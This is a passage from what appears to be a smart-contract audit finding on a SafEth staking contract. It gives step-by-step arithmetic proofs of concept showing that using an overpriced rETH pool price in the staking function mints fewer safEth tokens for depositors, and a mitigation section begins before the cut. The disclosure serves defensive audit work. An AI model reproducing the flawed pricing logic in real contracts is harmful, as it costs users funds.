class=\"mtk7\">100e18</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1000</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// not applying the deposit fee in rocketPool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">93988463204618701706</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">derivative</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">1063960369075232250</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">93988463204618701706</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">99999999999999999932</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">99999999999999999932</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">99999999999999999932</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">99999999999999999932</span></span></span></code></pre>\n<h3 id=\"proof-of-concept---part-2\" style=\"position:relative;\"><a href=\"#proof-of-concept---part-2\" aria-label=\"proof of concept   part 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept - Part 2</h3>\n<p>From the first POC, we calculated the outcome of 200e18 staked into the Reth derivative. We got the totalSupply and the Reth balance the derivative holds. So we can move onto the main POC, where l can show the difference and how much less minted tokens the user gets.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">totalSupply = 199999999999999999864;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Reth derivative balance = 187976926409237403412;</span></span></code></pre>\n<p>First l am going to show how much minted tokens the user is supposed to get without applying the issue occurring. And after that l will do the second one and apply the issue. So we can compare the outcomes and see how much less minted tokens the user gets.</p>\n<p>Without the issue occurring, a user deposits 5e18 by calling the staking function. The user received (4999549277935239332) minted tokens of safEth.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\">  = (</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) * </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\">  = (</span><span class=\"mtk7\">1063960369075232250</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">187976926409237403412</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\">  = </span><span class=\"mtk7\">199999999999999999864</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">199999999999999999864</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">199999999999999999864</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">199999999999999999864</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// As we have only derivative Reth in the example, it owns all of the weight.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">weight</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">totalWeight</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">5e18</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1000</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// not applying the deposit fee in rocketPool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4698999533488942411</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">derivative</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">1063960369075232250</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">4698999533488942411</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4999549277935239332</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4999549277935239332</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">4999549277935239332</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4999549277935239332</span></span></span></code></pre>\n<p>Stats after the deposit without the issue:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">totalSupply = 204999549277935239196</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Reth derivative balance = 192675925942726345823;</span></span></code></pre>\n<p>This time we apply the issue occurring and as the first one a user deposits 5e18 by calling the staking function. The user receives (4973574036557377784) minted tokens of saEth</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\">  = (</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) * </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// the function takes as account the pool price here which is overpriced.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\">  = (</span><span class=\"mtk7\">1069517062752670179</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">187976926409237403412</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\">  = </span><span class=\"mtk7\">201044530198482424206</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">199999999999999999864</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">201044530198482424206</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">199999999999999999864</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1005222650992412121</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// As we have only derivative Reth in the example, it owns all of the weight.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">weight</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">totalWeight</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">5e18</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1000</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// not applying the deposit fee in rocketPool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4698999533488942411</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Here the function calculates based on the normal price, as the pool has free space and the user deposits only 5e18.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">derivative</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">1063960369075232250</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">4698999533488942411</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4999549277935239332</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4999549277935239332</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">4999549277935239332</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1005222650992412121</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4973574036557377784</span></span></span></code></pre>\n<p>Stats after the deposit with the issue:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">totalSupply = 204973574036557377648;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Reth derivative balance = 192675925942726345823;</span></span></code></pre>\n<p>Difference between outcomes:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Without the issue based on 5e18 deposit, the user receives -        4999549277935239332 minted tokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">With the issue occurring based on 5e18 deposit, the user receives - 4973574036557377784 minted tokens</span></span></code></pre>\n<h3 id=\"proof-of-concept---plus\" style=\"position:relative;\"><a href=\"#proof-of-concept---plus\" aria-label=\"proof of concept   plus permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept - Plus</h3>\n<p>So far we found that this issue leads to users receiving less minted shares, but let’s go even further and see how much the user losses in terms of ETH. By unstaking the minted amount.</p>\n<p>First we apply the stats without the issue occurring.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">totalSupply = 204999549277935239196</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Reth derivative balance = 192675925942726345823;</span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">() * </span><span class=\"mtk12\">_safEthAmount</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">safEthTotalSupply</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">192675925942726345823</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">4999549277935239332</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">204999549277935239196</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4698999533488942410</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Eth value based on the current eth price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Reth to Eth value - 4698999533488942410 =&gt; 4.999999999999999998 - 8766.85 usd</span></span></span></code></pre>\n<p>Second we apply the stats with the issue occurring.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">totalSupply = 204973574036557377648;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Reth derivative balance = 192675925942726345823;</span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">() * </span><span class=\"mtk12\">_safEthAmount</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">safEthTotalSupply</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">192675925942726345823</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">4973574036557377784</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">204973574036557377648</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4675178189396666336</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Eth value based on the current eth price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Reth to Eth value - 4675178189396666336 =&gt; 4.974637740558436705 - 8722.41 usd</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The problem occurs with calculating the underlyingValue in the staking function. The function “ethPerDerivative” is called with all of the Reth balance, which should not be the case here. Therefore the function calls “poolCanDeposit” in order to check if the pool has space for the Reth derivative balance (Basically the contract thinks that the Reth balance in the derivative will be deposited in the pool, which is not the case here). So even if the pool has space for the depositing amount by the user, the poolCanDeposit(_amount) will return false and the contract will get the poolPrice of the reth which is supposed to be used only for the swap in Uniswap. The contract process executing the staking function with the overpriced pool price and doesn’t perform any swap, but deposits the user funds to the pool.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"><code class=\"grvsc-code\"><span 